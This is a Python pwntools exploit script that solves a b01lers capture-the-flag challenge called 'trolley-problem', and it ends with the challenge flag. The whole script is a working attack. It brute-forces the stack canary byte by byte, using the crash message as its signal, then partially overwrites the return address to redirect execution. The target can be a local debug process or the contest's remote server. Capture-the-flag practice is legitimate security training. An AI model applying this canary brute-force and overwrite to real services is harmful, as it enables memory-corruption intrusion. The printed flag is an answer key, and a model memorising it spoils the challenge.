from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./src/chall', '''
    set follow-fork-mode child
    set detach-on-fork off
    b *(trolley_problem+302)
    continue
''')

# p = remote('trolley-problem.harkonnen.b01lersc.tf', 8443, ssl=True)

log.info("Brute-forcing canary value byte by byte...")
canary_bytes = b'\x00'
for byte_position in range(7):
    for i in range(256):
        if bytes([i]) == b'\x0a':
            continue
        p.sendlineafter(b"What do you do?\n", b'A')
        p.sendlineafter(b"What do you do?\n", b'A'*0x18+canary_bytes+bytes([i]))
        if b"** stack smashing detected ***: terminated\n" not in p.recvuntil(b"Oh no!"):
            canary_bytes += bytes([i])
            log.info(f"Found byte \\x{i:02x} at position {byte_position+1+1}/8!")
            break
canary_value = u64(canary_bytes)
log.info(f"Found full canary value: {hex(canary_value)}")

log.info("Partially overwriting return address...")
p.sendlineafter(b"What do you do?\n", b'A'*0x18+p64(canary_value)+b'A'*0x8+b'\xd6')

p.interactive()

# bctf{why_c4nt_th3_tr0113y_dr1v3r_ju5t_pu11_th3_3m3rg3ncy_br4k3_5mh}